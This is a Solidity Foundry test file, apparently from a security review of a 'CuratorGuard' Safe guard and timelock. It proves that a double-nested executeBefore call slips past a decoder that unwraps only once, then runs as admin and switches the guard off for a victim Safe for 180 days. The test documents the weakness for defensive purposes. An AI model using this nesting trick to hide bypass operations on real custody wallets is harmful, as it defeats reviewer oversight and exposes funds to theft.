// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import "forge-std/Test.sol";

import {Safe} from "safe-contracts-v1.4.1/contracts/Safe.sol";
import {SafeProxy} from "safe-contracts-v1.4.1/contracts/proxies/SafeProxy.sol";

import {CuratorGuard} from "contracts/guards/CuratorGuard.sol";
import {CuratorGuardPolicy} from "contracts/guards/CuratorGuardPolicy.sol";
import {CuratorGuardTimelock} from "contracts/guards/CuratorGuardTimelock.sol";
import {ISafe} from "contracts/interfaces/safe/ISafe.sol";

/// @dev g19g: THE ADVERSARY AFTER THE MASK. The forwarded-caller rail now masks to 160 bits (G16d-1), so the
///      forwarded-caller family is fail-closed. The next cheapest NEW path is the tooling decoder, not the
///      contract. The `--op` path requires every call to be executeBefore-wrapped and to target the guard; the
///      sync/verify decoder unwraps executeBefore EXACTLY ONCE and renders the inner call by name, tagging a
///      sensitive inner call `[ROLE / INCIDENT-SENSITIVE]`. A call wrapped TWICE
///      (`executeBefore(d1, executeBefore(d2, bypass(safe, 180 days)))`) still EXECUTES the inner bypass as the
///      admin (the timelock is the guard's DEFAULT_ADMIN; executeBefore is delegatecall-to-self, msg.sender is
///      preserved through both frames), but the decoder shows only the opaque inner bytes and tags it with the
///      mild `[NOT A SYNC CALL]`. This file proves the CONTRACT half: the nested wrap opens a 180-day admin
///      Bypass on the production guard+timelock (the real v1.4.1 Safe need not even be configured). The DECODER
///      half is shown by the companion node script (what describeGuardCall renders) and by the real-task drill.
contract G19gNestedWrapTest is Test {
    CuratorGuard internal guard;
    CuratorGuardTimelock internal tl;
    ISafe internal safe; // a victim custody Safe (the bypass turns the guard off for it)

    address internal constant VETRO = address(0xA11CE);
    address internal constant COUNCIL = address(0xC0C11);
    address internal constant PROPOSER = address(0x9001); // a (compromised) proposer EOA stand-in
    address internal constant P2 = address(0x9002);
    address internal constant VETO = address(0x7E70);
    address internal constant EXECUTOR = address(0xE0E0); // the open executor: ANY key
    address internal constant OWNER = address(0x0B0B);
    uint256 internal constant T0 = 1_800_000_000;
    bytes32 internal constant SALT = keccak256("g19g");

    function setUp() public {
        vm.warp(T0);
        address[] memory _p = new address[](2);
        _p[0] = PROPOSER;
        _p[1] = P2;
        address[] memory _c = new address[](1);
        _c[0] = VETO;
        tl = new CuratorGuardTimelock(1 days, _p, _c);
        // Production shape: the timelock is the guard's DEFAULT_ADMIN.
        guard = new CuratorGuard(1 days, address(tl), COUNCIL);
        safe = _safe141(OWNER);
    }

    function _safe141(address owner_) internal returns (ISafe _s) {
        Safe _singleton = new Safe();
        SafeProxy _proxy = new SafeProxy(address(_singleton));
        address[] memory _owners = new address[](1);
        _owners[0] = owner_;
        Safe(payable(address(_proxy))).setup(_owners, 1, address(0), "", address(0), address(0), 0, payable(address(0)));
        _s = ISafe(address(_proxy));
    }

    /// @dev A single-wrapped bypass is what the decoder SEES and tags [ROLE / INCIDENT-SENSITIVE]: the honest case.
    function _singleWrap(uint64 d_, uint64 dur_) internal view returns (bytes memory) {
        return abi.encodeCall(guard.executeBefore, (d_, abi.encodeCall(guard.bypass, (address(safe), dur_))));
    }

    /// @dev The nested wrap the decoder does NOT see through: the inner bypass is opaque bytes to a one-level
    ///      unwrap, and its name never reaches the SENSITIVE_CALL regex, so the tag is only [NOT A SYNC CALL].
    function _nestedWrap(uint64 d1_, uint64 d2_, uint64 dur_) internal view returns (bytes memory) {
        bytes memory _inner = abi.encodeCall(guard.executeBefore, (d2_, abi.encodeCall(guard.bypass, (address(safe), dur_))));
        return abi.encodeCall(guard.executeBefore, (d1_, _inner));
    }

    function test_nested_executeBefore_opens_a_180_day_admin_bypass_through_the_open_executor() public {
        uint64 _dur = 180 days; // the ADMIN cap: the guard is inert for the victim Safe for half a year
        uint64 _d1 = uint64(T0 + 60 days);
        uint64 _d2 = uint64(T0 + 60 days);
        bytes memory _op = _nestedWrap(_d1, _d2, _dur);

        // A compromised proposer schedules it at the live minDelay (1 day). _checkScheduled passes: target=guard
        // has code, delay == getMinDelay(), not an updateDelay self-call.
        vm.prank(PROPOSER);
        tl.schedule(address(guard), 0, _op, bytes32(0), SALT, 1 days);
        bytes32 _id = tl.hashOperation(address(guard), 0, _op, bytes32(0), SALT);
        assertTrue(tl.isOperationPending(_id), "scheduled");

        // Before: the victim Safe is in Lockdown (unconfigured default), guard fully on.
        assertEq(uint8(guard.mode(address(safe))), uint8(CuratorGuardPolicy.Mode.Lockdown), "guard on before");

        // The delay passes; ANY key executes (open executor).
        vm.warp(T0 + 1 days + 1);
        vm.prank(EXECUTOR);
        tl.execute(address(guard), 0, _op, bytes32(0), SALT);

        // After: a 180-day admin Bypass is open for the victim Safe -> the guard is inert for it.
        assertEq(uint8(guard.mode(address(safe))), uint8(CuratorGuardPolicy.Mode.Bypass), "guard OFF after (admin bypass)");
        (uint64 _until, bool _council) = guard.bypassWindow(address(safe));
        assertEq(_until, uint64(T0 + 1 days + 1) + _dur, "180-day window");
        assertEq(_council, false, "an ADMIN window (councilBypass == false): nothing is checked on the owner path");
        assertEq(uint256(_dur), uint256(180 days), "the admin cap, not the 7-day council cap");
    }

    /// @dev Control: the SINGLE-wrapped bypass executes identically (same custody effect) -- the difference is
    ///      only in what the decoder shows (opaque+mild for the nested form). Both reach the admin bypass.
    function test_single_wrap_opens_the_same_bypass_but_the_decoder_would_show_it() public {
        bytes memory _op = _singleWrap(uint64(T0 + 60 days), 180 days);
        vm.prank(PROPOSER);
        tl.schedule(address(guard), 0, _op, bytes32(0), SALT, 1 days);
        vm.warp(T0 + 1 days + 1);
        vm.prank(EXECUTOR);
        tl.execute(address(guard), 0, _op, bytes32(0), SALT);
        assertEq(uint8(guard.mode(address(safe))), uint8(CuratorGuardPolicy.Mode.Bypass), "same effect");
    }
}
